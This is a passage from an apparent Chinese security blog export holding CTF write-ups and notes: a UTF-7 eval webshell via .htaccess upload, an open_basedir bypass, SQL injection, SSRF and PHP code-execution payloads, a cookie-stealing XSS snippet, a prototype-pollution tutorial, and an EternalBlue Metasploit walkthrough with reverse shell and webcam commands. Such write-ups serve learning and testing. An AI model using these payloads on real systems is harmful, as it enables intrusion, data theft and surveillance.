<h4 id="绕过get-the-flag-函数"><a href="#绕过get-the-flag-函数" class="headerlink" title="绕过get_the_flag()函数"></a>绕过<code>get_the_flag()</code>函数</h4><p>  该函数主要过滤了ph文件后缀，但没有过滤其他文件后缀，而文件内容则过滤&lt;?,并且使用<code>exif_imagetype</code>对文件进行了判断是否为图片,考虑php7已经抛弃了<code>&lt;script language=&#39;php&#39;&gt;</code>和&lt;<code>%</code></p>
<p>  所以可以使用UTF-7进行攻击。即上传<code>.htaccess</code>设置如下代码：</p>
<pre><code class="C">  #define 4c11f3876d494218ff327e3ca6ac824f_width 1337
  #define 4c11f3876d494218ff327e3ca6ac824f_height 1337
  AddType application/x-httpd-php .aaa #将后缀为.aaa的解析为php
  php_flag display_errors on #关闭报错
  php_flag zend.multibyte 1
  php_value zend.script_encoding &quot;UTF-7&quot; #设置解码UTF-7</code></pre>
<p>  绕过<code>exif_imagetype</code>的检测，首先看一下这个函数的文档说明（图1），该函数读取图像的第一个字节，也就是说读取图片文件头，如果这个文件头是PHP自带的常量那么就可以通过检测。PHP常量如（图二）,只能使用xbm图片常量而其他常量都会导致<code>.htaccess</code>无法解析。因为XBM图片使用C代码作为表示，也就是在文件头定义两个常量分别是宽和高。这样既可绕过图片头检测。</p>
<pre><code class="C">  #define test_width 16
  #define test_height 7</code></pre>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661483646268.png" alt></p>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661482481850.png" alt></p>
<p>这样就成功上传了<code>.htaccess</code>文件，但是构造shell并不能直接上传因为过滤&lt;?，但是我们上面设置了解码<code>UTF-7</code>，那么我们就可以构造<code>UTF-7</code>编码的payload(<a href="http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7</a>).</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661488438097.png" alt></p>
<ul>
<li><p>UTF-7一句话木马</p>
<p>我们将木马同样上传上去，注意后缀为.aaa直接上菜刀连接。</p>
</li>
</ul>
<pre><code>#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;a&#39;+AF0)+ADs?+AD4-</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661494271641.png" alt></p>
<p>也可以使用phpinfo进行测试是否执行成功代码。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661495566481.png" alt></p>
<h4 id="open-basedir绕过bypass"><a href="#open-basedir绕过bypass" class="headerlink" title="open_basedir绕过bypass"></a>open_basedir绕过bypass</h4><p>  <code>open_basedir</code>是php.ini中对目录进行授权的设置，使用菜刀连上后发现无法访问其他目录。所以考虑bypass<code>open_basedir</code>,这是一个外国大佬在今年四月份放出来的payload，具体原理我也不懂（—_—）.</p>
<p>  新建一个php文件，写入如下代码即可列出任意目录文件列表。</p>
<pre><code class="PHP">&lt;?php
ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
mkdir(&#39;/tmp/fuck/&#39;);
chdir(&#39;/tmp/fuck/&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
var_dump(scandir(&#39;/&#39;));
?&gt;</code></pre>
<p>可以看到flag文件名直接将<code>scandir</code>改成<code>file_get_contents()</code>读取flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661500221290.png" alt></p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
mkdir(&#39;/tmp/fuck/&#39;);
chdir(&#39;/tmp/fuck/&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
var_dump(file_get_contents()(&#39;THis_Is_tHe_F14g&#39;));
?&gt;</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661918208968.png" alt></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>红帽杯线下部分 writeup</title>
    <url>//articles/d68bf56e4f.html</url>
    <content><![CDATA[<h2 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h2><ul>
<li>首先直奔<code>install.php</code>发现源码中并没有做出重装限制，并且在<code>config.php</code>可以知道数据库和账号密码直接重装系统拿下后台。</li>
<li>拿下后台发现系统设置处可以修改上传文件类型。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745165921699.png" alt="img"></p>
<ul>
<li>但是加入php后缀你发现会将phpt替换为X,从源码中可有很直观看到这点。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745169665422.png" alt="img"></p>
<ul>
<li>此时毫无头绪，代码审计数量太大，所以黑盒测试一下，发现数据备份处可以执行sql语句。本以为可以直接写文件，但是失败了，联想到上面上传文件后缀我们可以直接在备份文件里面修改后缀是PHP，最后直接getshell即可。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745175748287.png" alt="img"></p>
<ul>
<li>导入备份后发现设置中的上传后缀有php</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745180341751.png" alt="img"></p>
<ul>
<li>直接上传php文件直接getshell</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745181028456.png" alt="img"></p>
<h2 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h2><p>/index.php/home/test存在一处后门直接可getflag</p>
<pre><code>// /Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php
///Home/Test/dlfile?file_url=file:///flag&amp;save_to=/var/www/html/1.txt
    // 下载图片
public function dlfile($file_url, $save_to)
{
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_POST, 0); 
        curl_setopt($ch,CURLOPT_URL,$file_url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        $file_content = curl_exec($ch);
        curl_close($ch);
        $downloaded_file = fopen($save_to, &#39;w&#39;);
        fwrite($downloaded_file, $file_content);
        fclose($downloaded_file);
}</code></pre>]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>(转载)JavaScript原型链污染攻击学习笔记</title>
    <url>//articles/d6927ee6b1.html</url>
    <content><![CDATA[<h1 id="Js面向对象的特点"><a href="#Js面向对象的特点" class="headerlink" title="Js面向对象的特点"></a>Js面向对象的特点</h1><pre><code class="javascript">d={&quot;d&quot;:&quot;ddd&quot;,dd:dd()}
-&gt;Object{d:&quot;ddd&quot;,dd:dd)()}
d.dd-&gt;fuction dd()
d.d-&gt;&quot;ddd&quot;
d[&#39;d&#39;]-&gt;&quot;ddd&quot;</code></pre>
<p>也就是说在JavaScript中能够使用多种方法去操作对象。</p>
<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和_proto_"></a>prototype和_proto_</h1><ul>
<li><p>JavaScript中要定义一个类需要使用构造函数的方式去定义:</p>
</li>
<li><p>例如：</p>
</li>
</ul>
<pre><code class="javascript">function foo(){
this.bar = 1;
}
new foo()</code></pre>
<ul>
<li>当然和其他语言的类一样能够在类内部构造方法。</li>
<li>例如:</li>
</ul>
<pre><code class="javascript">function Foo() {
    this.bar = 1
    this.show = function() {
        console.log(this.bar)
    }
}

(new Foo()).show()</code></pre>
<ul>
<li>但是每次实例化类时候都会执行一次this.show = function…，这个show是绑定在对象上而非在类中。如果希望new类时候希望只创建一次show方法，那么就需要使用prototype(原型)：</li>
</ul>
<pre><code class="javascript">function Foo() {
    this.bar = 1
}

Foo.prototype.show = function show() {
    console.log(this.bar)
}

let foo = new Foo()
foo.show()</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669736689501.png" alt="img"></p>
<ul>
<li>我们可以认为原型prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的foo对象，其天生就具有foo.show()方法。在js中，所有的对象都是从各种基础对象继承下来的，所以每个对象都有他的父类，通过prototype可以直接操作修改父类的对象。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669747911191.png" alt="img"></p>
<ul>
<li>一般函数默认的<code>prototype</code>是一个类型为<code>&quot;object&quot;</code>的对象，它有两个属性：<code>constructor</code>和 <code>__proto__</code>。其中<code>constructor</code>属性指向这个函数自身，<code>__proto__</code>属性指向<code>Object.prototype</code>，这说明<strong>一般</strong>函数的<code>prototype</code>属性是由<code>Object</code>函数生成的.</li>
</ul>
<h1 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h1><p><img src="http://goodcheerleung.gitee.io/mycute/20190828/1566975471640.png" alt="img"></p>
<pre><code class="javascript">function Father() {
    this.first_name = &#39;Donald&#39;
    this.last_name = &#39;Trump&#39;
}

function Son() {
    this.first_name = &#39;Melania&#39;
}

Son.prototype = new Father()

let son = new Son()
console.log(`Name: ${son.first_name} ${son.last_name}`)</code></pre>
<p>最终出来的结果很明显，son中并没有last_name这个属性那么他会到原型链上查找，那么最终打印出来的<code>son.last_name</code>那会是<code>Trump</code></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669757963394.png" alt="img"></p>
<h1 id="原型链污染攻击"><a href="#原型链污染攻击" class="headerlink" title="原型链污染攻击"></a>原型链污染攻击</h1><pre><code class="javascript">// foo是一个简单的JavaScript对象
let foo = {bar: 1}

// foo.bar 此时为1
console.log(foo.bar)

// 修改foo的原型（即Object）
foo.__proto__.bar = 2

// 由于查找顺序的原因，foo.bar仍然是1
console.log(foo.bar)

// 此时再用Object创建一个空的zoo对象
let zoo = {}

// 查看zoo.bar
console.log(zoo.bar)
//最后，虽然zoo是一个空对象{}，但zoo.bar的结果居然是2：</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669760404403.png" alt="img"></p>
<p>原因也显而易见：因为前面我们修改了foo的原型foo.<strong>proto</strong>.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象let zoo = {}，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
<h1 id="哪些情况下原型链会被污染？"><a href="#哪些情况下原型链会被污染？" class="headerlink" title="哪些情况下原型链会被污染？"></a>哪些情况下原型链会被污染？</h1><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<strong>proto</strong>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
<p>对象merge<br> 对象clone（其实内核就是将待操作的对象merge到一个空对象中）<br> 以对象merge为例，我们想象一个简单的merge函数：</p>
<pre><code>function merge(target, source) {
    for (let key in source) {
        if (key in source &amp;&amp; key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
123456789</code></pre><p>在合并的过程中，存在赋值的操作target[key] = source[key]，那么，这个key如果是<strong>proto</strong>，是不是就可以原型链污染呢？</p>
<p>我们用如下代码实验一下：</p>
<pre><code>let o1 = {}
let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
1234567</code></pre><p>结果是，合并虽然成功了，但原型链没有被污染：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669765556435.png" alt="img"></p>
<p>这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, “<strong>proto</strong>”: {b: 2}}）中，<strong>proto</strong>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，<strong>proto</strong>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<strong>proto</strong>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<pre><code>let o1 = {}
let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
1234567</code></pre><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190828/15669765952903.png" alt="img"></p>
<p>这是因为，JSON解析的情况下，<strong>proto</strong>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h1 id="文章来源"><a href="#文章来源" class="headerlink" title="文章来源"></a>文章来源</h1><p><a href="https://xz.aliyun.com/t/2802" target="_blank" rel="noopener">https://xz.aliyun.com/t/2802</a></p>
<p><a href="https://blog.csdn.net/qq_41107295/article/details/95789944" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/95789944</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto</a>__</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title>2020″第五空间”智能安全大赛线上初赛Writeup</title>
    <url>//articles/d69999e3fb.html</url>
    <content><![CDATA[<h3 id="美团外卖"><a href="#美团外卖" class="headerlink" title="美团外卖"></a>美团外卖</h3><p>这道题是我上次日的裸聊木马后台…..</p>
<h4 id="登陆注入"><a href="#登陆注入" class="headerlink" title="登陆注入"></a>登陆注入</h4><ul>
<li>从<code>login.php</code>,登陆是调用了<code>\common\Function.php</code>,的<code>login()</code>函数。直接定位到该函数(如下)，可以看到他对调用了<code>GetValue()</code>可以简单了解传入了用户名和表名获取了密码再和传入的密码的md5加密后的值进行比较。</li>
</ul>
<pre><code class="php">function Login(){
    $x1=1;//用户名长度限制
    $x2=1;//用户密码长度限制
    if(strlen(P(&#39;username&#39;))&gt;0 and strlen(P(&#39;password&#39;))&gt;0){
if(1&lt;0){
    Nts(&#39;请输入信息登录&#39;);
}
else{

    if(GetValue(&#39;admin.upass&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;)==md5(P(&#39;password&#39;))){
    $_SESSION[&#39;adminuser&#39;]=array();
    $_SESSION[&#39;adminuser&#39;][&#39;uname&#39;] = GetValue(&#39;admin.uname&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;);
    $_SESSION[&#39;adminuser&#39;][&#39;id&#39;] = GetValue(&#39;admin.id&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;);
    $_SESSION[&#39;adminuser&#39;][&#39;qudao&#39;] = GetValue(&#39;admin.qudao&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;);
        Tz(&#39;index&#39;);
    }
    else{
        Nts(&#39;登录失败！&#39;);
    }

}    
    }

}</code></pre>
<ul>
<li>我们再来看<code>GetValue()</code>的原函数，在同一文件下的243行，可以明显看到没有对传入参数进行过滤，而且对传入的第一个参数进行了分割，我们在登陆验证时候传入的第一参数是<code>admin.upass</code>，也就是分割成，admin和upass,第二个参数是<code>&quot;uname=&#39;&quot;.P(&#39;username&#39;)</code>可以还原为：<code>select upass  from admin  where uname=&#39;$_POST[&#39;username]&#39;</code>，这里我们直接传入一个不存在的用户名使用联合注入指定返回的密码即可</li>
</ul>
<pre><code class="php">function GetValue($str,$where){
    $str = explode(&#39;.&#39;,$str);
    $a = mysqli_query($GLOBALS[&#39;link&#39;],&quot;select &quot;.$str[1].&quot; from &quot;.$str[0].&quot; where $where&quot;);
    $row = mysqli_fetch_array($a);
    if($row){
        return $row[$str[1]];
    }
    else{
        return false;
        }
}</code></pre>
<ul>
<li>登陆注入payload如下：</li>
</ul>
<pre><code>账号:1&#39;union select &#39;21232f297a57a5a743894a0e4a801fc3&#39;--+
密码：admin</code></pre><h4 id="导出列表显注"><a href="#导出列表显注" class="headerlink" title="导出列表显注"></a>导出列表显注</h4><ul>
<li>在daochu.php存在明显的注入。关键代码如下，直接使用联合注入即可：</li>
</ul>
<pre><code class="php">if($type==1){
    $biao=&#39;content&#39;;
    $result = mysqli_query($link,&#39;select * from &#39;.$biao.&#39; where imei=&quot;&#39;.$imei.&#39;&quot; and  imei2=&quot;&#39;.$imei2.&#39;&quot;&#39;);

    echo &#39;select * from &#39;.$biao.&#39; where imei=&quot;&#39;.$imei.&#39;&quot; and  imei2=&quot;&#39;.$imei2.&#39;&quot;&#39;；


echo &#39;&lt;table border=&quot;1&quot;&gt;&#39;;
echo &#39;&lt;tr&gt;&lt;th&gt;user&lt;/th&gt;&lt;th&gt;code&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;phonenumber&lt;/th&gt;&lt;/tr&gt;&#39;;
while ($row = mysqli_fetch_assoc($result)){
    echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&#39;imei&#39;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&#39;imei2&#39;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&#39;name&#39;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&#39;tel&#39;].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;
}
echo &#39;&lt;/table&gt;&#39;;
}</code></pre>
<ul>
<li>payload:</li>
</ul>
<pre><code class="http">daochu.php?imei=a&amp;type=1&amp;imei=-1&amp;imei2=-1%22union+select+1,2,3,(select+hints+from+hint),5,6--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200624224236.png" alt="微信截图_20200624224236"></p>
<h4 id="文件上传发现后门"><a href="#文件上传发现后门" class="headerlink" title="文件上传发现后门"></a>文件上传发现后门</h4><ul>
<li>提示看<code>956c110ef9decdd920249f5fed9e4427</code>看这个文件夹。打开还是这个系统，不过这次这个系统文件是齐全的。我们在代码审计时候就发现<code>\lib\webuploader\0.1.5\serverpreview.php</code>能够上传文件。于是构造构造一个base64上传一个文件看看,提示<code>!!!! Congratulations on infiltrating here, but it&#39;s a pity that someone has infiltrated and left a Trojan, do not continue here , please see the e98a4571cf72b798077d12d6c94629.php !!!!!</code> OK最后直接getflag即可。。。。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200624224641.png" alt="微信截图_20200624224641"></p>
<ul>
<li>最终EXP</li>
</ul>
<pre><code class="http">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200624224840.png" alt="微信截图_20200624224840"></p>
<h3 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a><strong>hate-php</strong></h3><ul>
<li>老套路取反,没啥难度</li>
<li>EXP</li>
</ul>
<pre><code class="php">http://121.36.74.163/?code=${~%a0%b8%ba%ab}{%a0}(${~%a0%b8%ba%ab}{%a1})&amp;%a0=highlight_file&amp;%a1=flag.php</code></pre>
<h3 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h3><ul>
<li>上来直接来代码,代码是从xctf-final里面一道题扣出来的。总共有五个文件，index.php、xxe.php、hints.php、main.php、flag.php，从代码来看，第一步ssrf没有直接传参的，所以目测使用gopher://进行post打xxe.但是我一直没有构造成功。</li>
</ul>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
#本题无法访问外网
#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了
#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好
#there is xxe.php
$poc=$_SERVER[&#39;QUERY_STRING&#39;];
if(preg_match(&quot;/log|flag|hist|dict|etc|file|write/i&quot; ,$poc)){
                die(&quot;no hacker&quot;);
        }
$ids=explode(&#39;&amp;&#39;,$poc);
$a_key=explode(&#39;=&#39;,$ids[0])[0];
$b_key=explode(&#39;=&#39;,$ids[1])[0];
$a_value=explode(&#39;=&#39;,$ids[0])[1];
$b_value=explode(&#39;=&#39;,$ids[1])[1];

if(!$a_key||!$b_key||!$a_value||!$b_value)
{
        die(&#39;我什么都没有~&#39;);
}
if($a_key==$b_key)
{
    die(&quot;trick&quot;);
}

if($a_value!==$b_value)
{
        if(count($_GET)!=1)
        {
                die(&#39;be it so&#39;);
        }
}
foreach($_GET as $key=&gt;$value)
{
        $url=$value;
}

$ch = curl_init();
    if ($type != &#39;file&#39;) {
        #add_debug_log($param, &#39;post_data&#39;);
        // 设置超时
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    } else {
        // 设置超时
        curl_setopt($ch, CURLOPT_TIMEOUT, 180);
    }

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    // 设置header
    if ($type == &#39;file&#39;) {
        $header[] = &quot;content-type: multipart/form-data; charset=UTF-8&quot;;
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    } elseif ($type == &#39;xml&#39;) {
        curl_setopt($ch, CURLOPT_HEADER, false);
    } elseif ($has_json) {
        $header[] = &quot;content-type: application/json; charset=UTF-8&quot;;
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }

    // curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#39;);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
    // dump($param);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
    // 要求结果为字符串且输出到屏幕上
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // 使用证书：cert 与 key 分别属于两个.pem文件


    $res = curl_exec($ch);
    var_dump($res);</code></pre>
<ul>
<li>这里出题人使用$_SERVER[‘QUERY_STRING’]对参数进行过滤，众所周知$_SERVER[‘QUERY_STRING’]是不会进行urldecode的。所以这里直接urlencode直接可以绕过这个过滤，getflag.</li>
</ul>
<pre><code>http://121.36.64.91/?a=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</code></pre>]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>TG-hack CTF Write Up</title>
    <url>//articles/d6b507308d.html</url>
    <content><![CDATA[<h1 id="Tghack-CTF-WP"><a href="#Tghack-CTF-WP" class="headerlink" title="Tghack CTF WP"></a>Tghack CTF WP</h1><h2 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#12" target="_blank" rel="noopener"><strong>Nora - Norasaurus#8234</strong></a></p>
<p>Here is your Gaia form to get your weekly plant rations. Complete the form and reap your reward!</p>
<p><a href="https://redux.tghack.no/" target="_blank" rel="noopener">redux.tghack.no</a></p>
</blockquote>
<p>FLAG in a JavaScript File.</p>
<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>We found the Mother cult merch store. In addition to selling clothing items they sell some secrets we need. For the time being we haven’t been able to secure the funds necessary to do so. Can you help us?</p>
<ul>
<li><a href="https://shop.tghack.no/" target="_blank" rel="noopener">shop.tghack.no</a></li>
</ul>
</blockquote>
<p>O-M-G,I regret it very much.😂My friends and I were still discussing last night  about it might have changed the price to negative. I found it could be bought when the id undefined. But I forgot to check it when price to negative.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692758656.png" alt="img"></p>
<p>We use burp suite to packet capture and change the price to negative .It is very important to change the id to undefined.</p>
<p>e g:</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866688491552.png" alt="img"></p>
<p>And then,it happened that is amazing!We have more money!</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866691878335.png" alt="img"></p>
<p>OK，we can buy the flag….</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692306869.png" alt="img"></p>
<h2 id="Bobby"><a href="#Bobby" class="headerlink" title="Bobby"></a>Bobby</h2><blockquote>
<p> Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>Little bobby forgot his password. Can you help him log in?</p>
<p><a href="https://bobby.tghack.no/" target="_blank" rel="noopener">bobby.tghack.no</a></p>
</blockquote>
<p>I didn’t find any bugs in this container at 1st😭.After a long time,My classmate told me ,it has an SQL injection in the new password param when you change the pass.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866718226965.png" alt="img"></p>
<p>We can know that it’s a update sql and we can control a  param .</p>
<p>eg:</p>
<blockquote>
<p>update table set column=’param’ where ……</p>
</blockquote>
<p>1st,I want to commented out “where“ and I write payload like the following . But it can ‘t change passwd and throw me an error…..</p>
<pre><code>admin&#39;-- &#39; WHERE user=? AND pass=?</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866726963625.png" alt="img"></p>
<p>From here we should bind 2 params to this sql.So we change this payload like this:</p>
<pre><code>admin&#39;,user=? , pass=? -- </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866730992987.png" alt="img"></p>
<p>And then , we changed this admin’s pass,we can get flag, when we login.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866731884985.png" alt="img"></p>
<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>We have found a forum used by members of the Mother cult. The members are sitting behind an advanced firewall without access to the internet. We need their super secret information.</p>
<p><a href="https://exfiltration.tghack.no/" target="_blank" rel="noopener">exfiltration.tghack.no</a></p>
</blockquote>
<pre><code class="javascript">&lt;script&gt;
let xhr = new XMLHttpRequest();
xhr.open(&quot;post&quot;, window.location.href, true);
xhr.send(document.cookie);
&lt;/script&gt;</code></pre>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <url>//articles/d6d0747d1e.html</url>
    <content><![CDATA[<pre><code>1.实验环境：（1）win7靶机一台（2）kail linux攻击机</code></pre><p>2.渗透前信息收集<br>（1）使用扫描器扫描内网打开445端口的计算机</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190911/15682097323968.png" alt="img"></p>
<p>3.扫描存在漏洞的Ip</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190911/15682098226388.jpg" alt="img"></p>
<pre><code>调用永恒之蓝：use exploit/windows/smb/ms17_010_eternalblue
设置客户端IP：set rhost 10.**.**.7*
设置payload:set payload windows/x64/meterpreter/reverse_tcp
设置监听的IP：set lhost 10.*.*.*
meterspoilt常用命令：
摄像头：
ecord_mic       --&gt;X秒从默认的麦克风record_mic音频记录（音频录制）
webcam_chat      --&gt;开始视频聊天（视频，对方会有弹窗）
webcam_list      --&gt;单摄像头（查看摄像头列表）
webcam_snap      --&gt;采取快照从指定的摄像头（摄像头拍摄一张照片）
webcam_stream    --&gt;播放视频流从指定的摄像头（开启摄像头监控）
其他：
getsystem        --&gt;获取高权限
hashdump         --&gt;获取当前用户hash
pwd              --&gt;查看工作目录
screenshot       --&gt;截屏
search -f *.doc  --&gt;搜索文件（doc）</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190911/15682098703131.png" alt="img"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP走私漏洞-RoarCTF2019-easycalc</title>
    <url>//articles/d6d78f7a68.html</url>
